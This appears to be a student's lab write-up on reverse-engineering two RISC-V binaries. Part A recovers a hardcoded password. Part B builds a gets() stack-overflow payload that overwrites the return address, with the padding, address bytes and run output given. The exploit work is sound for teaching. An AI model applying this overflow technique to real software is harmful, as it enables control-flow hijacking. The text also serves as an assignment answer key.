# Question 3 — Reverse Engineering

Both binaries are **RISC-V 64-bit ELF executables**, statically linked, compiled with `-no-pie -fno-PIE`. I analyzed using `riscv64-linux-gnu-objdump` and `strings`, and tested with `qemu-riscv64`.

---

## Part A 

### Analysis

Disassembling `main` revealed a straightforward flow:

```
scanf("%63s", buffer)       # read up to 63 chars from stdin
strcmp(buffer, secret)       # compare input against hardcoded string
if (result == 0) → "You have passed!"
else             → "Sorry, try again."
```

The password string was found in the `.rodata` section at offset `0x5e091`:

```
qvBdHWYM+mx//rR4rYNRBn/5p2dJl/JZ7rAfhCi3oNA=
```

### Verification

The GOT entries confirmed the cross-references:

- `0x83f78` → format string `%63s`
- `0x83f80` → password string (above)
- `0x83f88` → `"You have passed!\n"`
- `0x83f90` → `"Sorry, try again.\n"`

### How to run

```bash
qemu-riscv64 './a/target_raunak-gupta-2615(1)' < a/payload.txt
# Output: You have passed!
```

---

## Part B 

### Analysis

Disassembling `main` revealed an intentionally unsolvable comparison:

```asm
main:
    addi  sp, sp, -16         # allocate frame (16 bytes)
    sd    ra, 8(sp)           # save return address at sp+8
    addi  sp, sp, -224        # allocate 224-byte buffer
    mv    a0, sp              # a0 = buffer
    call  _IO_gets            # gets(buffer) — NO bounds checking
    mv    a0, sp              # a0 = sp (always non-zero)
    bnez  a0, .fail           # ALWAYS branches to .fail (sp ≠ 0)
```

Key observations:

1. **`gets()`** is used instead of `scanf` — no length limit on input
2. The branch `bnez a0, .fail` checks if `sp != 0`, which is **always true**
3. There is **no legitimate way** to reach `.pass` — it's only reachable by exploiting the buffer overflow

### Stack Layout

```
┌─────────────────────┐  ← original sp
│  (caller's frame)   │
├─────────────────────┤  ← sp after `addi sp, sp, -16`
│  saved s0  (8 bytes)│  offset +0
│  saved ra  (8 bytes)│  offset +8  ← RETURN ADDRESS
├─────────────────────┤  ← sp after `addi sp, sp, -224`
│                     │
│  buffer (224 bytes)  │
│                     │
└─────────────────────┘  ← sp (buffer start, passed to gets)
```

- Buffer starts at `sp` (bottom)
- Return address (`ra`) is at `sp + 224 + 8 = sp + 232`

### Exploit

By sending **232 bytes of padding** followed by the **address of `.pass`** (`0x104e8`) in little-endian, we overwrite the saved return address. When `main` executes `ret`, it jumps to `.pass` instead of the real caller.

```
payload = b'A' * 232 + b'\xe8\x04\x01\x00\x00\x00\x00\x00'
           ─────────   ────────────────────────────────────
           padding      .pass address (0x104e8) in LE
```

This works because:

- **`-no-pie`**: Code is at fixed addresses (no ASLR), so `0x104e8` is always correct
- **`gets()`**: No bounds checking, allows arbitrary overflow
- **No stack canary**: No stack protector to detect the overwrite

### How to run

```bash
qemu-riscv64 './b/target_raunak-gupta-2615(1)' < b/payload
# Output:
#   Sorry, try again.     ← from normal execution (always hits .fail)
#   You have passed!      ← from overwritten return address jumping to .pass
#   Segmentation fault    ← expected (corrupted stack, .pass also returns to garbage)
```

The "Sorry" message is unavoidable since the normal code path always branches to `.fail`. The passing criterion only requires the output to **contain** `"You have passed!"`, which it does.
